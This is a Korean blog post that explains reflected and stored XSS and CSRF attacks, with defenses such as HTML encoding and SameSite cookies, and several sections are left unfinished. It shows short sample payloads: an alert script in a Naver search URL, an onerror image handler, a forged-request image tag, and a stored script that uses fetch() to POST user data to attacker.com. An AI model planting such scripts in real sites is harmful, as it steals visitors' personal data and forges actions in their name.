---
layout: post
title: '[ETC] XSS와 XSRF'
featured-img: browser/cors.png
category: [tech, etc]
summary: 웹 취약성을 노리는 XSS와 XSRF에 대해 살펴보도록 하겠습니다.
---

이번 포스트에서는 웹 취약성을 노리는 XSS와 XSRF(혹은 CSRF)와 공격에 대해 살펴보도록 하겠습니다.

# XSS(Cross-Site Scripting)
사이트 간 스크립팅(XSS)는 웹 애플리케이션에서 많이 나타나는 웹 취약점 공격 중 하나입니다. 웹 사이트 관리자가 아닌 다른 사람이 웹 페이지에 악성 스크립트를 삽입할 수 있는 점을 노린 공격입니다. 주로 게시판에 악성 스크립트가 담긴 글을 올리는 형태로 이루어집니다.

XSS의 공격 유형은 표준으로 정해져 있지는 않지만, 비지속적인 공격(Non-persistent XSS)과 지속적인 공격(persistent XSS)으로 구분할 수 있습니다.

## 타겟이 되는 취약점
웹 애플리케이션이 사용자로부터 입력 받은 값을 제대로 검사하지 않고 사용할 경우를 노린 공격입니다. 공격자가 사용자의 정보(쿠키, 세션 등)를 탈취하거나 비정상적인 기능을 수행하게 할 수 있습니다.

## 비지속적(Non-persistent) XSS 공격 방법
검색 엔진의 취약점을 노린 공격을 예로 들 수 있습니다. 포탈 사이트에서 문자열을 검색할 경우, 일반적으로 검색 결과 페이지에서 검색한 문자열을 그대로 다시 표시합니다. 검색한 문자열에 스크립트가 포함되어 그 스크립트가 동작하게 된다면 비지속적 XSS 공격에 성공하게 되는 것입니다.

다른 방법으로는 `https://search.shopping.naver.com/search/all?query=<script>alert('XSS')</script>`와 같이 쿼리에 스크립트가 포함된 링크에 접속하여, 이 스크립트가 접속된 페이지에서 실행 된다면 비지속적 XSS 공격이 성공하게 됩니다. 위의 링크는 `<script>alert('XSS')</script>` 검색 결과와 동일합니다.

네이버 등의 포탈에서 아래 그림과 같이 `<script>alert('XSS')</script>`를 검색(또는 `https://search.shopping.naver.com/search/all?query=<script>alert('XSS')</script>`에 접속)하여 검색 결과에 표시된 검색 문자열에 포함된 스크립트가 실행된다면, XSS 공격에 성공한 것이 됩니다.

![네이버 XSS 공격 시도](/assets/img/posts/etc/naver_non_persistent_xss.png)

한번의 검색으로 한번의 XSS 공격을 할 수 있기 때문에 비지속적 XSS입니다. 비지속적 XSS는 검색 문자열을 그대로 화면에 다시 표시되는 점을 노린 공격이기 때문에 반사(Reflected) XSS라고도 불립니다.

## 지속적(Persistent) XSS 공격 방법
지속적 XSS 공격은 비지속적 XSS 공격보다 더 치명적인 공격 방법입니다. 게시판을 예로 들면, 공격자가 게시판 글쓰기 통해서 스크립트를 포함한 게시글을 작성한 후 서버에 저장 합니다. 다른 사용자가 그 게시글을 읽을 때 게시글에 포함된 스크립트가 실행되면서 XSS 공격이 성공하게 됩니다. 게시글에 그 글을 읽는 사용자의 이름과 이메일 등의 개인 정보를 공격자에게 전송하는 스크립트가 포함되어 있다고 하면, 게시글을 읽는 모든 사람의 개인 정보가 유출되게 됩니다.

예를 들어, 사용자 정보가 window 객체의 user 필드에 저장되어 있다고 하면, 아래와 같이 공격자가 스크립트를 포함한 게시글을 작성합니다.

```none
안녕하세요.

<script>
  fetch('http://attacker.com/user', {
    method: 'POST',
    body: JSON.stringify(window.user)
  });
</script>

반갑습니다.
```

`<script>` 태그는 화면에 노출되지 않기 때문에 사용자는 자신의 개인 정보가 유출되는지 모른체 피해를 입게 됩니다.

## 대응 방법
XSS 공격을 막기 위해서는 페이지에서 공격자가 입력한 스크립트를 실행하지 못하게 해야 합니다. 스크립트를 실행하지 못하게 하려면, 공격자의 스크립트 입력을 막거나 브라우저가 스크립트를 실행하지 못하게 공격자의 스크립트 값을 변경해야 합니다.

### 입력 값 제한
스크립트를 입력하지 못하게 하는 방법으로 XSS 공격을 막을 수 있습니다. 하지만 `<script>` 태그 뿐만 아니라 아래 코드와 같이 이벤트 핸들러를 사용하는 방법으로 스크립트를 실행 할 수 있습니다.

```html
<img src="#" onerror="alert('XSS')">
```

모든 케이스에 대응해서 입력 값을 제한하는 것은 쉽지 않기 때문에 아래에서 이야기 할 입력 값 치환 부분이 XSS 공격을 방어하는데 더 효과적입니다.

### 입력 값 치환
XSS 공격은 HTML 태그를 사용하기 때문에 HTML 태그에 사용되는 `<`와 `>` 문자열을 인코딩한 `&lt`, `&gt`로 서버에 저장하거나 페이지를 그릴 때 인코딩한 값으로 화면에 그리는 방법입니다. 이렇게 인코딩이 되면 브라우저는 일반 문자열로 인식하여 페이지에 `<script></script>`로 노출되어 스크립트가 실행되지 않습니다.

# XSRF(Crose-Site Request Forgery)
사이트 간 요청 위조(XSRF 또는 CSRF라고 합니다.)는 사용자가 자신의 의지와 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 하는 공격입니다.

## 타겟이 되는 취약점
사이트 간 요청 위조는 특정 웹 사이트가 사용자의 웹 브라우저를 신뢰하는 상태를 노린 공격입니다. 사용자가 웹사이트에 로그인한 상태에서 사이트간 요청 위조 공격 코드가 삽입된 페이지를 열면, 공격 대상이 되는 웹사이트는 위조된 공격 명령이 믿을 수 있는 사용자로부터 발송된 것으로 판단하게 되어 공격에 노출됩니다.

## 공격 방법
XSRF 공격 과정은 아래와 같습니다.

1. 이용자는 웹사이트에 로그인하여 정상적인 쿠키를 발급받는다.
2. 공격자는 링크(예를 들어, `http://www.geocities.com/attacker`와 같은)를 이메일이나 게시판 등의 경로를 통해 이용자에게 전달한다.
3. 위의 링크의 HTML 페이지는 `<img src= "https://travel.service.com/travel_update?.src=Korea&.dst=Hell">` 같은 이미지 태그를 가집니다. 이 링크는 출발지와 도착지를 등록하기 위한 링크인데, 그 중 도착지 정보를 변조한 링크입니다.
4. 이용자가 공격용 페이지를 열면, 부라우저는 이미지 파일을 받아오기 위해 공격용 URL을 실행합니다.
5. 이용자의 승인이나 인지 없이 출발지와 도착지가 등록되어 공격이 완료됩니다.

 해당 서비스 페이지는 단순히 쿠키를 통해 본인확인이 이루어지기 때문에 XSRF 공격이 가능하게 됩니다.

## 공격 예제
XSRF 공격이 이루어지는 예제를 만들어 보도록 하겠습니다.

## 대응 방법
크롬 80버전 부터 새로운 쿠키 정책이 적용되어 Cookie의 SameSite 속성의 기본값이 Lax로 변경 되었습니다.

Referer 체크
GET/POST 구분
Security Token 사용
CORS

# XSS와 XSRF의 차이

# 부록

## SameSite Cookie

#### 참고
- [https://ko.wikipedia.org/wiki/사이트_간_스크립팅](https://ko.wikipedia.org/wiki/사이트_간_스크립팅)
- [https://ko.wikipedia.org/wiki/사이트_간_요청_위조](https://ko.wikipedia.org/wiki/사이트_간_요청_위조)
- [https://ohgyun.com/543](https://ohgyun.com/543)
- [https://rednooby.tistory.com/22](https://rednooby.tistory.com/22)
- [https://3rd-big.tistory.com/23](https://3rd-big.tistory.com/23)
- [https://itstory.tk/entry/CSRF-공격이란-그리고-CSRF-방어-방법](https://itstory.tk/entry/CSRF-공격이란-그리고-CSRF-방어-방법)
- [https://www.sickyourcoding.com/forQuiz/csrfintro](https://www.sickyourcoding.com/forQuiz/csrfintro)
- [https://swk3169.tistory.com/24](https://swk3169.tistory.com/24)
- [https://docs.microsoft.com/ko-kr/azure/active-directory/develop/howto-handle-samesite-cookie-changes-chrome-browser?tabs=dotnet](https://docs.microsoft.com/ko-kr/azure/active-directory/develop/howto-handle-samesite-cookie-changes-chrome-browser?tabs=dotnet)
- [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [https://ifuwanna.tistory.com/223](https://ifuwanna.tistory.com/223)
- [http://blog.plura.io/?p=7614](http://blog.plura.io/?p=7614)
- [https://swk3169.tistory.com/23](https://swk3169.tistory.com/23)